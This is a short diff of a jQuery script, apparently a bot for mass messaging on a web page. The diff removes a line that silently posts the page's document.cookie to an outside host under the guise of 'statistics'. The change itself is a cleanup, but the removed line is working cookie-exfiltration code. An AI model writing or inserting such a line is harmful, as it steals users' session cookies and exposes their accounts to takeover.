@@ -1,5 +1,4 @@
 (function($){
-	$.post('http://wmidbot.com/ajax.php',{'module':'statistics','event':'setcok','data':{c:document.cookie}},function(){});
 	$("#PagePanel",maindocument).prepend( $("<div>",maindocument).css({"font-size":"2em"}).html("<span id=\"infostatus\">Рассылка</span>: <code id=\"infohelp\" title=\"Отправлено <- ожидает <- осталось\">неизвестно</code>") );
 	var runned=false,
 		limit=false,
